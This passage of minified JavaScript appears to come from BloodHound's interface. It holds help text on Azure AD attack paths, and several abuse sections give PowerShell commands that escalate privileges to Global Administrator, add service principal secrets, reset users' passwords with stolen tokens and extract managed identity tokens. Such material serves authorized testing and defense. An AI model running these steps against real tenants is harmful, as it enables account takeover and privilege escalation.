MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]})},mr={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]})},br={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]})},yr={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]})},gr={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created during post-processing. It is created against AzureAD tenant objects when a Service Principal has one of the following MS Graph app role assignments:"}),h(A,{variant:"body2",children:p(Z,{children:[h(q,{children:h(Y,{children:"AppRoleAssignment.ReadWrite.All"})}),h(q,{children:h(Y,{children:"RoleManagement.ReadWrite.Directory"})})]})})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"With the ability to grant arbitrary app roles, you can grant the RoleManagement.ReadWrite.Directory app role to a Service Principal you already control, and then promote it or another principal to Global Administrator."}),h(A,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant app roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),h(A,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Use BARK's Get-AllAzureADServicePrincipals to collect all Service Principal objects in the tenant:"}),h(A,{component:"pre",children:'"$SPs = Get-AllAzureADServicePrincipals `\n    -Token $MGToken"'}),h(A,{variant:"body2",children:"Next, find the MS Graph Service Principal's ID. You can do this by piping $SPs to Where-Object, finding objects where the appId value matches the universal ID for the MS Graph Service Principal, which is 00000003-0000-0000-c000-000000000000:"}),h(A,{component:"pre",children:'$SPs | ?{$_.appId -Like "00000003-0000-0000-c000-000000000000"} | Select id'}),h(A,{variant:"body2",children:"The output will be the object ID of the MS Graph Service Principal. Take that ID and use it as the \"ResourceID\" argument for BARK's New-AppRoleAssignment function. The AppRoleID of '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8' is the universal ID for RoleManagement.ReadWrite.Directory. The SPObjectId is the object ID of the Service Principal you want to grant this app role to:"}),h(A,{component:"pre",children:'\'New-AppRoleAssignment `\n    -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `\n    -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `\n    -Token $MGToken\''}),h(A,{variant:"body2",children:"If successful, the output of this command will show you the App Role assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory MS Graph app role, you can promote the Service Principal to Global Administrator using BARK's New-AzureADRoleAssignment."}),h(A,{component:"pre",children:'New-AzureADRoleAssignment `\n    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n    -Token $MGToken'}),h(A,{variant:"body2",children:"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:'When you assign an app role to a Service Principal, the Azure Audit logs will create an event called "Add app role assignment to service principal". This event describes who made the change, what the target service principal was, and what app role assignment was granted.'})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]})},wr={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created during post-processing. It is created against all AzureAD admin roles when a Service Principal has the following MS Graph app role assignment:"}),h(A,{variant:"body2",children:h(Z,{children:h(q,{children:h(Y,{children:"RoleManagement.ReadWrite.Directory"})})})}),h(A,{variant:"body2",children:"This privilege allows the Service Principal to promote itself or any other principal to any AzureAD admin role, including Global Administrator."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"To abuse this privilege, you can promote a principal you control to Global Administrator using BARK's New-AzureADRoleAssignment."}),h(A,{variant:"body2",children:"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant AzureAD admin roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),h(A,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Then use BARK's New-AzureADRoleAssignment function to grant the AzureAD role to your target principal:"}),h(A,{component:"pre",children:'New-AzureADRoleAssignment `\n    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n    -Token $MGToken'}),h(A,{variant:"body2",children:"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:'When you assign an AzureAD admin role to a principal using this privilege, the Azure Audit log will create an event called "Add member to role outside of PIM (permanent)".'})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]})},fr={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]})},vr={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]})},Ar={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]})},Sr={general:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]})},Tr={general:()=>h(A,{variant:"body2",children:"Azure resources like Virtual Machines, Logic Apps, and Automation Accounts can be assigned to either System- or User-Assigned Managed Identities. This assignment allows the Azure resource to authenticate to Azure services as the Managed Identity without needing to know the credential for that Managed Identity. Managed Identities, whether System- or User-Assigned, are AzureAD Service Principals."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can modify the Azure RM resource to execute actions against Azure with the privileges of the Managed Identity Service Principal."}),h(A,{variant:"body2",children:"It is also possible to extract a JSON Web Token (JWT) for the Service Principal, then use that JWT to authenticate as the Service Principal outside the scope of the Azure RM resource. Here is how you extract the JWT using PowerShell:"}),h(A,{component:"pre",children:'$tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"\n$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI\n$tokenResponse.access_token'}),h(A,{variant:"body2",children:"We can then use this JWT to authenticate as the Service Principal to the Microsoft Graph APIs using BARK for example."})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1078/",children:"https://attack.mitre.org/techniques/T1078/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a",children:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines",children:"https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"https://github.com/BloodHoundAD/BARK"})]})},kr=(e,t)=>e&&t?"Group"===e?`The members of the ${Cr(e)} ${t} have`:`The ${Cr(e)} ${t} has`:"This entity has",Cr=e=>e?"GPO"===e||"OU"===e?e:e.toLowerCase():"",Pr={general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:["The ",Cr(t)," ",e," is a member of the group ",r,"."]}),h(A,{variant:"body2",children:"Groups in Azure Active Directory grant their direct members any privileges the group itself has. If a group has an AzureAD admin role, direct members of the group inherit those permissions."})]}),abuse:()=>h(A,{variant:"body2",children:"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."}),opsec:()=>h(A,{variant:"body2",children:"No opsec considerations apply to this edge."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/groups-create-eligible",children:"Create a role-assignable group in Azure Active Directory"})})},Dr={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created to link Azure Kubernetes Service Managed Clusters to the Virtual Machine Scale Sets they use to execute commands on."}),h(A,{variant:"body2",children:"The system-assigned identity for the AKS Cluster will have the Contributor role against the target Resource Group and its child Virtual Machine Scale Sets."})]}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"You will abuse this relationship by executing a command against the AKS Managed Cluster the edge is emiting from. You can target any managed identity assignment scoped to the Virtual Machine Scale Sets under the target Resource Group."})}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/",children:"Karl Fosaaen - How To Extract Credentials from Azure Kubernetes Service (AKS)"})]})},Rr={general:()=>h(A,{variant:"body2",children:"Object ownership means almost all abuses are possible against the target object."}),abuse:()=>h(A,{variant:"body2",children:"Everything a Contributor can do, with the addition of assigning rights to resources."}),opsec:()=>h(A,{variant:"body2",children:"This depends on which abuse you perform, but in general Azure will create a log for each abuse action."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-with-custom-script-extensions/",children:"https://blog.netspi.com/attacking-azure-with-custom-script-extensions/"})})},Or={general:()=>h(A,{variant:"body2",children:"This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant. Principals with this role can update sensitive properties for all users. Privileged Authentication Administrator can set or reset any authentication method (including passwords) for any user, including Global Administrators."}),abuse:()=>p(u,{children:[h(A,{variant:"body1",children:"Set secret for Service Principal (AZAddSecret abuse info)"}),h(A,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),h(A,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),p(A,{variant:"body2",children:["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",h(A,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk…" -TenantID "contoso.onmicrosoft.com"'})]}),p(A,{variant:"body2",children:["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",h(A,{component:"pre",children:'New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token'})]}),p(A,{variant:"body2",children:["The output will contain the plain-text secret you just created for the target app:",h(A,{component:"pre",children:'PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…'})]}),p(A,{variant:"body2",children:["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",h(A,{component:"pre",children:'PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID "4d31…" `-ClientSecret "odg8Q~..." `-TenantName "contoso.onmicrosoft.com" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…'})]}),h(A,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."}),h(A,{variant:"body1",children:"Reset password of user (AZResetPassword abuse info)"}),h(A,{variant:"body2",children:"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."}),h(A,{variant:"body2",children:'The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click "Reset Password" on the target user’s overview tab.'}),h(A,{variant:"body2",children:"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."}),h(A,{variant:"body2",children:"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."}),h(A,{variant:"body2",children:"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"}),h(A,{variant:"body1",children:"Using an MS Graph-scoped token"}),h(A,{variant:"body2",children:"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."}),h(A,{variant:"body2",children:"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"}),h(A,{component:"pre",children:'$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token'}),h(A,{variant:"body2",children:"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"}),h(A,{component:"pre",children:'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'}),p(A,{variant:"body2",children:['If successful, the output will include a "204" status code:',h(A,{component:"pre",children:"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"})]}),h(A,{variant:"body1",children:"Using an Azure Portal-scoped token"}),h(A,{variant:"body2",children:"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."}),h(A,{variant:"body2",children:"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"}),h(A,{component:"pre",children:'$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"}),h(A,{component:"pre",children:'Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID "targetuser@contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"If successful, the response will look like this:"}),h(A,{component:"pre",children:'StatusCode : 200 StatusDescription : OK Content : "Gafu1918" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}'}),h(A,{variant:"body2",children:'As you can see, the plain-text value of the user’s password is visible in the "Content" parameter value.'})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."}),h(A,{variant:"body2",children:"When resetting a user’s password and letting Azure set a new random password, Azure will log two events:"}),h(A,{variant:"body2",children:"“Reset user password” and “Reset password (by admin)”. These logs describe who performed the password reset, against which user, and at what time."}),h(A,{variant:"body2",children:"When setting a specified new password for the user, Azure will log two events:"}),h(A,{variant:"body2",children:"“Reset user password” and “Update user”. The first log will describe who changed the target’s password and when."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword",children:"PowerZure Set-AzureUserPassword"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator",children:"Microsoft Azure AD roles"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]})},Mr={general:()=>h(A,{variant:"body2",children:"The Privileged Role Admin role can grant any other admin role to another principal at the tenant level."}),abuse:()=>h(A,{variant:"body2",children:"Activate the Global Admin role for yourself or for another user using PowerZure or PowerShell."}),opsec:()=>h(A,{variant:"body2",children:"The Azure Activity Log will log who activated an admin role for what other principal, including the date and time."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole"})})},Ir={general:()=>h(A,{variant:"body2",children:"The ability to change another user's password without knowing their current password"}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."}),h(A,{variant:"body2",children:'The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click "Reset Password" on the target user’s overview tab.'}),h(A,{variant:"body2",children:"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."}),h(A,{variant:"body2",children:"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."}),h(A,{variant:"body2",children:"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"}),h(A,{variant:"body1",children:"Using an MS Graph-scoped token"}),h(A,{variant:"body2",children:"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."}),h(A,{variant:"body2",children:"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"}),h(A,{component:"pre",children:'$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token'}),h(A,{variant:"body2",children:"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"}),h(A,{component:"pre",children:'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'}),p(A,{variant:"body2",children:['If successful, the output will include a "204" status code:',h(A,{component:"pre",children:"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"})]}),h(A,{variant:"body1",children:"Using an Azure Portal-scoped token"}),h(A,{variant:"body2",children:"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."}),h(A,{variant:"body2",children:"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"}),h(A,{component:"pre",children:'$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"}),h(A,{component:"pre",children:'Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID "targetuser@contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"If successful, the response will look like this:"}),h(A,{component:"pre",children:'StatusCode : 200 StatusDescription : OK Content : "Gafu1918" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : 